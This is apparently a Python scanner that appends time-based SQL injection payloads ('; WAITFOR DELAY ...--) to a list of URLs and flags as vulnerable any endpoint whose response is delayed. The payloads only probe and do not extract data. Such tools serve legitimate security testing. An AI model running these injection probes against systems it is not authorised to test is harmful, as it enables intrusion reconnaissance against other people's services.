import argparse
import requests
import time

# Define the payloads for time-based SQL injection testing
payloads = [
    "'; WAITFOR DELAY '0:0:5'--",
    "'; WAITFOR DELAY '0:0:10'--",
    "'; WAITFOR DELAY '0:0:15'--"
]

def test_endpoint(endpoint):
    print(f"Testing endpoint: {endpoint}")
    is_vulnerable = False

    for i, payload in enumerate(payloads):
        print(f"Testing with payload {i + 1}/{len(payloads)}: {payload}")
        start_time = time.time()

        try:
            response = requests.get(endpoint + payload)
            elapsed_time = time.time() - start_time

            if elapsed_time > 5:
                print("Potential vulnerability detected with this payload.")
                is_vulnerable = True
                break
            else:
                print("No delay detected.")
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")
            continue

    return is_vulnerable

def main(endpoints_file, output_file):
    with open(endpoints_file, 'r') as f:
        endpoints = [line.strip() for line in f]

    results = []

    for endpoint in endpoints:
        if test_endpoint(endpoint):
            print(f"Confirmed vulnerability at endpoint: {endpoint}")
            results.append((endpoint, 'Vulnerable'))
        else:
            print(f"No vulnerability found at endpoint: {endpoint}")
            results.append((endpoint, 'Not Vulnerable'))

    with open(output_file, 'w') as f:
        for endpoint, status in results:
            f.write(f"{endpoint}: {status}\n")

    print(f"Results saved to {output_file}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SQL Injection Time-Based Checker")
    parser.add_argument("-l", "--list", required=True, help="File containing list of endpoints")
    parser.add_argument("-o", "--output", required=True, help="Output file to save results")

    args = parser.parse_args()

    main(args.list, args.output)
